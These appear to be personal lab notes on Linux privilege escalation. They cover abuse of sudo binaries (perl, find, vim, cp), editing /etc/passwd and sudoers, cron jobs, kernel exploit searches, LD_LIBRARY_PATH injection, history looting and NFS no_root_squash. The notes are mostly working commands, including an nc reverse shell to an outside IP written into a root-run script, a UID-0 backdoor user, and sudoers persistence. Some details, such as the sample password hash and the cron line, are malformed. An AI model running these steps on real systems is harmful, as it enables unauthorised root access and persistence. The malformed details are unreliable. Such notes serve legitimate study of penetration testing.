Linux Privilege Escalation:
sudo -l

Visit GTFOBins (https://gtfobins.github.io) and search for some of the program names. If the program is listed with "sudo" as a function, you can use it to elevate privileges, usually via an escape sequence.

sudo -l
This cmd will show the files that can be executed only by root user.
Output:
(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
nopasswd means we can run this as a root user without password.


Opening the backup.pl file
cat /home/itguy/backup.pl
Output:
#!/usr/bin/perl
system("sh", "/etc/copy.sh");

cat /etc/copy.sh
Output:
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f

So copy.sh is a reverse shell already existing in the folder.
We are going to change the ip and port in the reverse shell by modifying the file.

nano /etc/copy.sh
This cmd throws an error and says we don;t have permission.

Now we are going to use another way.
"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.29.210 4444 >/tmp/f" > /etc/copy.sh
This command works. And the file is modified.

nc -nvlp 4444
Run this in your machine.

Now execute the file in target machine.
sudo /usr/bin/perl /home/itguy/backup.pl
Now you got the revrse shell with root access in netcat
---------------------------------------------------------------------------------------------------


Editing /etc/passwd :
You can use this method only if you have access to /etc/passwd file
We are going to modify /etc/passwd file to gain root user.

openssl passwd -1 -salt user password 
The above cmd is the syntax.
openssl passwd -1 -salt wayne wayne
Output:
$dsafi4in.as45/
The output will be some hash value.

Now edit /etc/passwd file and add the below line
wayne:$dsafi4in.as45/:0:0:,,,:/home/wayne:/bin/bash
Check below Syntax:
user:hash:usernum:grpnum:description:homedirectory:execdir
0 is the root number, so we gave 0 in both user and group.
we are giving ,,, as description
------------------------------------------------------------------------------------------------


Editing sudoers files:
You can use this method only if you have access to /etc/sudoers file

Open the file, there is a line like this.
#User privilege specification
root    ALL=(ALL:ALL) ALL

Now add a new line below the root.
temp    ALL=(ALL:ALL) ALL
Now save the file.

Now in terminal give this cmd.
su temp
Ignore the password and press enter. Now got root access.!!!
------------------------------------------------------------------------------------------------


Find binary:
sudo -l
User temp may run following commands on kali:
     (root) NOPASSWD: /usr/bin/find
nopasswd means we can run this binary as a root user without password.

/usr/bin/find <filename> -exec <command>
/usr/bin/find error -exec whoami \;
Means if you find this file, then execute this command.

sudo /usr/bin/find sample -exec bash -i \;
\;  means to end this line.
This cmd will give you root shell.
You can also replace the command with bash reverse shell code from pentestmonkey.com
----------------------------------------------------------------------------------------------


Vim binary:
sudo -l
User temp may run following commands on kali:
     (root) NOPASSWD: /usr/bin/vim
nopasswd means we can run this binary as a root user without password.

Open vim by using this cmd "sudo vim":
And press "Shift + ;" and type.
:set shell=/bin/bash
Now again type "Shift + ;" and type
:shell

Now you got root shell.
If you want persistence, then you can edit /etc/sudoers file and add a user as root.
------------------------------------------------------------------------------------------------


cp binary:
sudo -l
User temp may run following commands on kali:
     (root) NOPASSWD: /usr/bin/cp
nopasswd means we can run this binary as a root user without password.

cp /etc/sudoers backup

We are copying the sudoers file and saving the contents to a new file.
But to read or edit the file we need root permission.
So we are going to copy this file and send it to our attacker machine, because we have root access in our attacker machine so we can read the contents.

cp backup /home/kali/Desktop/backup
Now goto attacker machine and edit the contents of the file.
And send it to the target machine.

sudo cp ./sudoers2 /etc/sudoers
Here we are replacing all contents in /etc/sudoers file with our sudoers2 file.

Now we got the root shell.!!!
------------------------------------------------------------------------------------------------


Cron Jobs:
If any cron jobs is running as root, then we can modify and get root shell.

cat /etc/crontab
Output:
** *** root cd /var/www/ && sudo bash .mysecretcronjob.sh

So there is a cron job running every minute executing the bash file.
We are going to modify the bash file.

nano .mysecretcronjob.sh 
Now add the bash reverse shell command inside the file and save it.
Then that bash file will get executed every minute. 
Now start netcat listener in attacker machine.
Now you got root shell.
----------------------------------------------------------------------------------------------


Kernel Exploits:
uname -a 
Use this cmd to find the kernel version.

Now use searchsploit to find exploit for the kernel version.
searchsploit linux kernel 5.1

Or you use this tool.
https://github.com/mzet-/linux-exploit-suggester.git
Just run this tool in the machine, it will tell you if there are any possible kernel exploits.

linux-exploit-suggester.sh -u "Linux kali 5.18.0-kali5-amd64 #1 SMP PREEMPT_DYNAMIC Debian 5.18.5-1kali6 (2022-07-07) x86_64 GNU/Linux"
--------------------------------------------------------------------------------------------------


LinPEAS:
It is privilege escalation tool for linux.
Run linpeas_base.sh in the target machine.
This will give all possible priv esc methods on that machine.

Linux Smart Enumeration:
It is a privilege escalation tool for linux.
This tool is like LinPEAS but this gives the info in more useful format.
run lse.sh in the target machine.
-------------------------------------------------------------------------------------------------


Readable SSH key:
With this misconfiguration we can read the ssh private key of the user, which we can later use it to login to that user without pass.

sshkey.private is the private key file in our scenario.

ssh -i sshkey.private bandit14@localhost
The above cmd is used to shh to the user account using their private key.
bandit14 is the 2nd target username.
--------------------------------------------------------------------------------------------------


LXD Containers:
LXD is a system container and virtual machine manager.
It offers a simple CLI and REST API to manage local and remote interfaces.


LD_LIBRARY_PATH Injection:
library_path.c this is the privesc file.
This file will unset the "LD_LIBRARY_PATH" variable and set the uid as 0 which is the root.

gcc -fPIC -shared -o /tmp/libdl.so.2 library_path.c
We have successfully compiled.

sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2
Now you got root shell.
--------------------------------------------------------------------------------------------

cat ~/.*history
This cmd will show all history.
Sometimes username and passwords or any sensitive info can be found in history.


------------------------------------------------------------------------------------------
Check the NFS share configuration:
cat /etc/exports
If specific directory has no_root_squash, then you can try privilege escalation.

Switch to root user in attacker machine.
mkdir /tmp/nfs
mount -o rw,vers= <victim-ip>:/tmp /tmp/nfs
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
chmod +xs /tmp/nfs/shell.elf

Now goto victim machine and run this.
/tmp/shell.elf

You will get a root shell.
